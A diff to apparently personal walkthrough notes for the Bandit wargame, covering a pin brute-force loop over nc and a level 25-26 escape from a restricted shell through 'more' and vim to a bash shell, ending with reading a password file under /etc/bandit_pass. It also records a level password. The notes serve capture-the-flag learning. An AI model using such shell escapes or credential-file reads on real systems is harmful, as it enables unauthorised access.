@@ -213,13 +213,28 @@ nmap localhost -p31000-32000 -A
     
     iterate | nc localhost 30002 | grep -v -E "Wrong"
     # grep -v -E filters out the wrong pin messages
-
+25-26: 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+    cat /etc/shells to find list of shells to try executing with ssh
+        /bin/sh
+        /bin/dash
+        /bin/bash
+        /bin/rbash
+        /usr/bin/tmux
+        /usr/bin/screen
+        /usr/bin/showtext
+    Not good enough --- default shells are stored in /etc/passwd
+    cat /etc/passwd | grep -E "bandit26"
+    results in /usr/bin/showtext
     
-
-
-
-
-
-
-
-        
+    cat /usr/bin/showtext
+    shows that the shell displays  more something with more
+    
+    resize the terminal window show more pauses before completing and the exit 0 command is issued
+    from the paused more, use command v to edit the text in vim
+    
+    you can do unix command from vim, but the default shell still just exits
+    :set shell=/bin/bash to make vim commands use a "real" shell
+    
+    :! executes commands from a shell
+    :! cat /etc/bandit_pass/bandit26
+   
